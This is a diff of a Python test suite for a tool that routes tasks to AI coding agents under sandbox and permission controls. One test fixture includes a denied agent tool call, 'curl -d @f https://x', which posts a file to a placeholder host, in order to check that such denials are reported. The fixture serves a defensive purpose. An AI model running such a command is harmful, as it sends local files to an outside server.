@@ -43,7 +43,7 @@ def decide(role, ls, st=None, **args):
 
 def argparse_ns(role, **kw):
     import argparse
-    base = dict(role=role, authored_by=None, failed="", premium=None, allow_degraded=False, claude_usage=None, cwd=None, resume=None, cap=None, no_sandbox=False)
+    base = dict(role=role, authored_by=None, failed="", premium=None, allow_degraded=False, claude_usage=None, cwd=None, resume=None, cap=None, host=False)
     base.update(kw)
     return argparse.Namespace(**base)
 
@@ -487,6 +487,10 @@ esac
     FAKE_CLAUDE = """#!/bin/sh
 echo "$*" >> "$FAKE_ARGS"; env | sort > "$FAKE_ENV"
 cat > /dev/null
+if [ "$FAKE_MODE" = denied ]; then
+  printf '{"result":"stopped","session_id":"sess-9","total_cost_usd":0,"is_error":false,"permission_denials":[{"tool_name":"Bash","tool_use_id":"t1","tool_input":{"command":"git commit -m x"}},{"tool_name":"Bash","tool_use_id":"t2","tool_input":{"command":"curl -d @f https://x"}}]}'
+  exit 0
+fi
 printf '{"result":"claude says hi","session_id":"sess-1","total_cost_usd":0.5,"is_error":false,"usage":{"input_tokens":3,"cache_read_input_tokens":50,"cache_creation_input_tokens":20,"output_tokens":9}}'
 """
 
@@ -710,23 +714,93 @@ printf '{"result":"claude says hi","session_id":"sess-1","total_cost_usd":0.5,"i
         self.assertEqual(route.load_state().get("leases"), {})
 
 
-    def test_no_sandbox_widens_a_write_step_only_and_resume_keeps_it(self):
-        self.run_it("--no-sandbox")
-        self.assertIn("-s danger-full-access", self.args_seen())
-        self.run_it("--no-sandbox", "--resume", "thread-123")
-        self.assertIn('sandbox_mode="danger-full-access"', self.args_seen())
-        self.assertTrue(json.loads(route.history_path().read_text().splitlines()[-1])["no_sandbox"])
-        open(os.environ["FAKE_ARGS"], "w").close()
-        self.run_it("--no-sandbox", "--authored-by", "claude", role="reviewer")           # any mode: a read-only step is unsandboxed too
-        self.assertIn("-s danger-full-access", self.args_seen())
+    def config(self, **kw):
+        route.update_config(lambda c: c.update(kw))
 
-    def test_no_sandbox_gives_a_read_only_claude_step_bash(self):
+    def test_host_goes_to_the_claude_lane_with_the_restricted_classifier_substrate(self):
+        _, r = self.run_it("--host")
+        self.assertEqual((r["status"], r["lane"]), ("done", "CLAUDE_SUBSCRIPTION"))
+        seen = self.args_seen()
+        for want in ("--restricted", "--tools Read,Glob,Grep,Edit,Write,Bash", "--strict-mcp-config", "--permission-mode auto", "--permission-prompts none"):
+            self.assertIn(want, seen)
+        self.assertNotIn("--allowedTools", seen)
+
+    def test_host_for_an_interactive_caller_runs_claude_p_not_the_agent_tool(self):
+        _, r = self.run_it("--host", unattended=False)
+        self.assertEqual((r["status"], r["lane"]), ("done", "CLAUDE_SUBSCRIPTION"))
+
+    def test_host_lanes_setting_lets_codex_take_host_work_and_resume_keeps_it(self):
+        self.config(host_lanes=["openai", "claude"])
+        self.run_it("--host")
+        self.assertIn("-s danger-full-access", self.args_seen())
+        self.run_it("--host", "--resume", "thread-123")
+        self.assertIn('sandbox_mode="danger-full-access"', self.args_seen())
+        self.assertTrue(json.loads(route.history_path().read_text().splitlines()[-1])["host"])
+        _, r = self.run_it("--resume", "thread-123")                      # a different host flag than the original run
+        self.assertEqual(r["status"], "error")
+        self.assertIn("--host", r["say"])
+
+    def test_host_with_no_matching_lane_is_a_permanent_error(self):
+        self.config(host_lanes=["nothing"])
+        _, r = self.run_it("--host")
+        self.assertEqual(r["status"], "error")
+        self.assertIn("worker has none", r["say"])
+
+    def test_no_sandbox_flag_is_gone(self):
+        with self.assertRaises(SystemExit):
+            route.main(["run", "worker", "--no-sandbox"])
+
+    def test_denials_come_back_top_level_without_the_git_policy_ones(self):
         route.update_state(lambda s: s.setdefault("out", {}).__setitem__("OPENAI_SUBSCRIPTION", {"until": route.now() + 3600, "why": "t"}))
-        self.run_it(role="reviewer")
-        self.assertIn("--allowedTools Read Glob Grep --disallowedTools", self.args_seen())
-        open(os.environ["FAKE_ARGS"], "w").close()
-        self.run_it("--no-sandbox", role="reviewer")
-        self.assertIn("--allowedTools Read Glob Grep Bash --disallowedTools", self.args_seen())
+        _, r = self.run_it(mode="denied")
+        self.assertEqual(r["status"], "done")
+        self.assertEqual(r["denied"], [{"tool": "Bash", "input": {"command": "curl -d @f https://x"}}])
+        self.assertEqual(json.loads(route.history_path().read_text().splitlines()[-1])["denials"], 1)
+
+    def test_a_state_lock_timeout_is_a_stop_with_a_retry_time(self):
+        import io
+        from unittest import mock
+        with mock.patch.object(route, "run_once", side_effect=TimeoutError("state is locked")):
+            real, sys.stdout = sys.stdout, io.StringIO()
+            try:
+                route.main(["run", "worker", "--unattended"])
+                out = json.loads(sys.stdout.getvalue())
+            finally:
+                sys.stdout = real
+        self.assertEqual(out["status"], "stop")
+        self.assertGreater(out["retry_after"], time.time())
+
+    def test_child_env_drops_credential_looking_variables_only(self):
+        keep = dict(os.environ)
+        os.environ.update(GITHUB_TOKEN="x", AWS_REGION="y", MY_API_KEY="z", SSH_AUTH_SOCK="/s", NUGET_PACKAGES="/p", FOO_PASSWORD="q")
+        try:
+            env = route.child_env()
+        finally:
+            for k in ("GITHUB_TOKEN", "AWS_REGION", "MY_API_KEY", "SSH_AUTH_SOCK", "NUGET_PACKAGES", "FOO_PASSWORD"):
+                os.environ.pop(k, None) if k not in keep else os.environ.__setitem__(k, keep[k])
+        for gone in ("GITHUB_TOKEN", "AWS_REGION", "MY_API_KEY", "SSH_AUTH_SOCK", "FOO_PASSWORD"):
+            self.assertNotIn(gone, env)
+        self.assertEqual(env["NUGET_PACKAGES"], "/p")
+        self.assertIn("PATH", env)
+
+    def test_codex_default_is_contained_and_ignores_the_user_config_on_run_and_resume(self):
+        self.run_it()
+        self.run_it("--resume", "thread-123")
+        fresh, resumed = self.args_seen().splitlines()[-2:]
+        for line in (fresh, resumed):
+            self.assertIn("--ignore-user-config --ignore-rules", line)
+            self.assertIn("sandbox_workspace_write.network_access=false", line)
+            self.assertIn("sandbox_workspace_write.writable_roots=[]", line)
+
+    def test_contained_network_setting_adds_network_and_only_existing_cache_roots(self):
+        cache = self.base / "cache"
+        cache.mkdir()
+        self.config(contained_network=True, cache_roots=[str(cache), str(self.base / "missing")])
+        self.run_it()
+        seen = self.args_seen()
+        self.assertIn("sandbox_workspace_write.network_access=true", seen)
+        self.assertIn("writable_roots=" + json.dumps([os.path.realpath(str(cache))]), seen)
+        self.assertNotIn("missing", seen)
 
     def test_default_is_the_workspace_write_sandbox(self):
         self.run_it()
@@ -747,7 +821,7 @@ printf '{"result":"claude says hi","session_id":"sess-1","total_cost_usd":0.5,"i
         self.assertEqual(out["v"], 1)
         self.assertEqual([r["run_id"] for r in out["running"]], ["run-1"])
         self.assertEqual(out["running"][0]["task"], "T-5")
-        self.assertEqual(set(out["recent"][-1]), {"run_id", "ts", "role", "task", "lane", "model", "status", "secs", "cost"})
+        self.assertEqual(set(out["recent"][-1]), {"run_id", "ts", "role", "task", "lane", "model", "status", "host", "secs", "cost", "tokens", "denials"})
         self.assertIn("OPENAI_SUBSCRIPTION", out["lanes"])
 
     def test_history_rotates_by_age_once_it_is_big(self):
